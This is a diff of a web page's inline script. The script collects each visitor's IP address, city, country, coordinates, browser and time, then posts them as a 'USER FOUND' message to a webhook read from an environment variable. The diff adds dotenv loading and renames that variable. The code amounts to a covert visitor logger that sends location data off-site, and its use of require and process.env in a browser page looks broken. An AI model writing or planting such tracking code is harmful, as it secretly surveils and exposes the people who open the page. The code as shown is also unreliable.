@@ -234,6 +234,9 @@
         <p style="text-align: center;">Powered by MaR Society © 2024</p>
     </div>
    <script>
+        const env = require('dotenv');
+        env.config();
+       
         function setCookie(cname, cvalue, exdays) {
             var d = new Date();
             d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
@@ -290,7 +293,7 @@
                     var longitude = data.loc.split(',')[1];
                     var browser = navigator.userAgent;
                     var currentTime = new Date().toLocaleString();
-                    var webhookUrl = process.env.visitor_webhook;
+                    var webhookUrl = process.env.WEBHOOK;
                     var message = "USER FOUND:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nbrowser was opened at: " + currentTime;
 
                     var xhr = new XMLHttpRequest();
